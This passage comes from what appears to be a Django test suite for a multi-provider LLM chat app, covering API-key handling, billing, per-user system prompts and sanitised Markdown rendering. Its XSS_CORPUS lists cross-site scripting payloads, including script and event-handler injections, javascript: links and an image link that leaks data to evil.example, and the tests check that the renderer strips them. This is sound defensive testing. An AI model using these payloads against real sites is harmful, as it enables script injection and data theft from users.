                        {"llm_model": self.model(api_model_id).pk, "content": "My draft"},
                        HTTP_ACCEPT="application/json",
                    )
                    self.assertEqual(response.status_code, expected)
                    self.assertEqual(Conversation.objects.count(), 0)
                    self.assertEqual(self.balance(), 2_000_000)
        post.side_effect = None

    def test_missing_key_affects_only_that_provider(self, post):
        for missing, api_model_id, _ in PROVIDER_MODELS:
            key_setting = f"{missing.upper()}_API_KEY"
            with self.subTest(missing=key_setting), override_settings(**{key_setting: ""}):
                for provider, other_id, cost in PROVIDER_MODELS:
                    self.reset()
                    post.reset_mock()
                    post.return_value = provider_reply(provider)
                    response = self.client.post(
                        reverse("chat_new"), {"llm_model": self.model(other_id).pk, "content": "Hi"}
                    )
                    if provider == missing:
                        self.assertEqual(response.status_code, 503)
                        post.assert_not_called()
                        self.assertEqual(self.balance(), 2_000_000)
                    else:
                        self.assertEqual(response.status_code, 302)

    def test_google_safety_block_is_charged_and_shown(self, post):
        post.return_value = provider_reply("google", safety=True, input_tokens=1000, output_tokens=0)
        self.client.post(reverse("chat_new"), {"llm_model": self.model("gemini-3.8-flash").pk, "content": "Hi"})
        conversation = Conversation.objects.get()
        reply = conversation.messages.last()
        self.assertEqual((reply.content, reply.stop_reason), ("", "safety"))
        self.assertEqual(self.balance(), 2_000_000 - 300)  # 1,000 input tokens at $0.30/1M
        page = main_region(self.client.get(reverse("chat_detail", args=[conversation.pk])))
        self.assertIn("The model declined to answer this (safety filter).", page)
        self.assertNotIn("$", page)
        self.assertContains(self.client.get(reverse("profile")), "(blocked)")

    def test_picker_lists_all_three_models(self, post):
        page = main_region(self.client.get(reverse("chat_new")))
        for label in ("Claude Haiku · Value", "GPT-5.6 Luna · Value", "Gemini Flash · Value"):
            self.assertIn(label, page)
        for group in ("Anthropic", "Google", "OpenAI"):
            self.assertIn(f'<optgroup label="{group}">', page)
        self.assertNotContains(self.client.get(reverse("model_list")), "Coming soon")


def sent_system_prompt(provider, body):
    """The system prompt as the provider received it, or None if none was sent."""
    if provider == "openai":
        first = body["messages"][0]
        return first["content"] if first["role"] == "system" else None
    if provider == "anthropic":
        return body.get("system")
    instruction = body.get("systemInstruction")
    return instruction["parts"][0]["text"] if instruction else None


@override_settings(
    OPENAI_API_KEY="test-openai-key",
    ANTHROPIC_API_KEY="test-anthropic-key",
    GOOGLE_API_KEY="test-google-key",
)
@mock.patch("llm.http.requests.post")
class GlobalSystemPromptTests(TestCase):
    def setUp(self):
        from django.core.management import call_command

        call_command("seed", stdout=mock.Mock())
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.client.force_login(self.user)

    def set_prompt(self, user, text):
        from accounts.services import get_settings

        row = get_settings(user)
        row.system_prompt = text
        row.save()

    def send(self, post, provider, api_model_id):
        post.return_value = provider_reply(provider)
        model = LLMModel.objects.get(api_model_id=api_model_id)
        response = self.client.post(reverse("chat_new"), {"llm_model": model.pk, "content": "Bonjour"})
        self.assertEqual(response.status_code, 302)
        return post.call_args.kwargs["json"]

    def test_prompt_sent_in_each_providers_format(self, post):
        self.set_prompt(self.user, "Always reply in French.")
        for provider, api_model_id, _ in PROVIDER_MODELS:
            with self.subTest(provider=provider):
                body = self.send(post, provider, api_model_id)
                self.assertEqual(sent_system_prompt(provider, body), "Always reply in French.")
                if provider == "openai":
                    self.assertEqual(body["messages"][1], {"role": "user", "content": "Bonjour"})

    def test_no_prompt_means_no_system_field(self, post):
        for prompt in ("", "   \n  "):
            self.set_prompt(self.user, prompt)
            for provider, api_model_id, _ in PROVIDER_MODELS:
                with self.subTest(provider=provider, prompt=repr(prompt)):
                    body = self.send(post, provider, api_model_id)
                    self.assertIsNone(sent_system_prompt(provider, body))
                    self.assertNotIn("system", body)
                    self.assertNotIn("systemInstruction", body)
                    if provider == "openai":
                        self.assertNotIn("system", [m["role"] for m in body["messages"]])

    def test_another_users_prompt_is_never_sent(self, post):
        bob = User.objects.create_user("bob", password=PASSWORD)
        self.set_prompt(bob, "Bob's secret instructions")
        for provider, api_model_id, _ in PROVIDER_MODELS:
            with self.subTest(provider=provider):
                body = self.send(post, provider, api_model_id)
                self.assertNotIn("Bob's secret", str(body))

    def test_prompt_is_read_at_send_time(self, post):
        self.set_prompt(self.user, "First instruction")
        body = self.send(post, "anthropic", "claude-haiku-4-5-20251001")
        self.assertEqual(body["system"], "First instruction")
        conversation = Conversation.objects.get()
        self.set_prompt(self.user, "Changed instruction")
        post.return_value = provider_reply("anthropic")
        self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Encore"})
        self.assertEqual(post.call_args.kwargs["json"]["system"], "Changed instruction")
        # The prompt isn't part of the stored history or the thread.
        self.assertNotIn("instruction", "".join(conversation.messages.values_list("content", flat=True)))

    def test_charging_and_402_unchanged(self, post):
        self.set_prompt(self.user, "Always reply in French.")
        self.send(post, "google", "gemini-3.8-flash")
        self.assertEqual(Wallet.objects.get(user=self.user).balance_micros, 2_000_000 - 1_050)
        post.reset_mock()
        Wallet.objects.filter(user=self.user).update(balance_micros=0)
        model = LLMModel.objects.get(api_model_id="gpt-5.6-luna")
        response = self.client.post(reverse("chat_new"), {"llm_model": model.pk, "content": "Hi"})
        self.assertEqual(response.status_code, 402)
        post.assert_not_called()


# --- Safe Markdown (loop 5) ---------------------------------------------------------

XSS_CORPUS = {
    "script tag": "<script>alert(1)</script>",
    "img onerror": '<img src=x onerror="alert(1)">',
    "iframe": '<iframe src="https://evil.example"></iframe>',
    "svg onload": "<svg onload=alert(1)>",
    "style tag": "<style>body{background:url(https://evil.example/x)}</style>",
    "raw js link": '<a href="javascript:alert(1)">x</a>',
    "md js link": "[click](javascript:alert(1))",
    "md js link, entity-encoded": "[click](&#106;avascript:alert(1))",
    "md data link": "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "autolink js": "<javascript:alert(1)>",
    "md image exfil": "![a](https://evil.example/leak?q=secret)",
    "aligned table (style)": "| a | b |\n|:--|--:|\n| 1 | 2 |",
    "code class injection": '```x" onmouseover="alert(1)\ncode\n```',
    "inline html in text": 'Hello <b onclick="alert(1)">there</b>',
}

SAFE_TAGS = {
    "p", "br", "strong", "em", "s", "del", "code", "pre", "blockquote", "ul", "ol", "li",
    "h1", "h2", "h3", "h4", "h5", "h6", "hr", "a", "table", "thead", "tbody", "tr", "th", "td",
}


def unsafe_html(html, allowed_tags=SAFE_TAGS):
    """Parse `html` and list anything that shouldn't reach the page from model output."""
    from html.parser import HTMLParser

    issues = []

    class Audit(HTMLParser):
        def handle_starttag(self, tag, attrs):
            if tag not in allowed_tags:
                issues.append(f"<{tag}>")
            for name, value in attrs:
                value = value or ""
                if name.startswith("on") or name in ("style", "src", "srcset"):
                    issues.append(f"{tag}[{name}]")
                if name == "href" and not value.lower().startswith(("http://", "https://", "mailto:")):
                    issues.append(f"{tag}[href={value[:30]}]")
                if tag == "code" and name == "class" and not re.fullmatch(r"language-[A-Za-z0-9_+-]+", value):
                    issues.append(f"code[class={value[:30]}]")

    Audit().feed(html)
    return issues


def thread_html(html):
    """Just the message thread (the page chrome has its own allowed elements)."""
    return html.split('class="thread-inner"', 1)[1].split('class="composer', 1)[0]


def rendered_model_output(html):
    """The inner HTML of every rendered reply. Sanitized output never contains a <div>,
    so the first </div> closes the fragment."""
    fragments = re.findall(r'<div class="bubble-text md">(.*?)</div>', html, re.S)
    assert fragments, "no rendered model reply found"
    return "".join(fragments)


class MarkdownRenderingTests(TestCase):
    def render(self, text):
        from chat.markdown import render_markdown

        return str(render_markdown(text))

    def test_xss_corpus_is_neutralized(self):
        for name, payload in XSS_CORPUS.items():
            with self.subTest(case=name):
                self.assertEqual(unsafe_html(self.render(payload)), [])

    def test_image_becomes_a_plain_link(self):
        html = self.render(XSS_CORPUS["md image exfil"])
        self.assertNotIn("<img", html)
        self.assertIn('href="https://evil.example/leak?q=secret"', html)
        self.assertIn('rel="noopener noreferrer nofollow"', html)

    def test_markdown_features(self):
        html = self.render(
            "**bold** *em* ~~gone~~ `inline`\n\n- one\n- two\n\n1. first\n\n"
            "> quoted\n\n[site](https://example.com)\n\n"
            "```python\nprint('<b>')\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |"
        )
        for fragment in (
            "<strong>bold</strong>", "<em>em</em>", "<s>gone</s>", "<code>inline</code>",
            "<ul>", "<li>one</li>", "<ol>", "<blockquote>",
            '<code class="language-python">print(\'&lt;b&gt;\')', "<pre>",
            "<table>", "<thead>", "<tbody>", "<td>1</td>",
            'href="https://example.com"', 'rel="noopener noreferrer nofollow"',
        ):
            self.assertIn(fragment, html)
        self.assertEqual(unsafe_html(html), [])

    def test_table_alignment_style_is_stripped(self):
        html = self.render(XSS_CORPUS["aligned table (style)"])
        self.assertIn("<table>", html)
        self.assertNotIn("style", html)

    def test_empty_and_none(self):
        self.assertEqual(self.render(""), "")
        self.assertEqual(self.render(None), "")


@override_settings(OPENAI_API_KEY="test-key")
@mock.patch("llm.http.requests.post")
class MarkdownInChatTests(TestCase):
    def setUp(self):
        self.user = User.objects.create_user("alice", password=PASSWORD)
        self.gpt = make_gpt()
        self.client.force_login(self.user)

    def test_corpus_through_page_and_json(self, post):
        for name, payload in XSS_CORPUS.items():
            with self.subTest(case=name):
                Conversation.objects.all().delete()
                # New chat via JSON -> main_html
                post.return_value = proxy_ok(payload)
                data = self.client.post(
                    reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"},
                    HTTP_ACCEPT="application/json",
                ).json()
                self.assertEqual(unsafe_html(rendered_model_output(data["main_html"])), [], "main_html")
                conversation = Conversation.objects.get()
                # Existing chat via JSON -> messages_html
                data = self.client.post(
                    reverse("chat_detail", args=[conversation.pk]), {"content": "Again"},
                    HTTP_ACCEPT="application/json",
                ).json()
                self.assertEqual(unsafe_html(rendered_model_output(data["messages_html"])), [], "messages_html")
                # Full page (form mode rendering)
                page = self.client.get(reverse("chat_detail", args=[conversation.pk])).content.decode()
                self.assertEqual(unsafe_html(rendered_model_output(page)), [], "page")
                # The whole thread, parsed: only Markdown tags plus our own div/span wrappers,
                # and no event handler, style, src or unsafe link anywhere.
                self.assertEqual(unsafe_html(thread_html(page), SAFE_TAGS | {"div", "span"}), [], "thread")

    def test_reply_renders_markdown_but_is_stored_raw(self, post):
        raw = "Here is **bold**:\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |"
        post.return_value = proxy_ok(raw)
        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"})
        conversation = Conversation.objects.get()
        reply = conversation.messages.get(role="assistant")
        self.assertEqual(reply.content, raw)  # stored raw

        page = thread_html(self.client.get(reverse("chat_detail", args=[conversation.pk])).content.decode())
        self.assertIn('<div class="bubble-text md"><p>Here is <strong>bold</strong>:</p>', page)
        self.assertIn("<table>", page)

        post.return_value = proxy_ok("ok")
        self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Next"})
        resent = post.call_args.kwargs["json"]["messages"]
        self.assertEqual(resent[1], {"role": "assistant", "content": raw})  # resent raw

    def test_user_messages_are_not_rendered(self, post):
        post.return_value = proxy_ok("fine")
        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "**not bold** <i>x</i>"})
        page = thread_html(self.client.get(reverse("chat_detail", args=[Conversation.objects.get().pk])).content.decode())
        self.assertIn("**not bold** &lt;i&gt;x&lt;/i&gt;", page)
        self.assertNotIn("<strong>not bold</strong>", page)
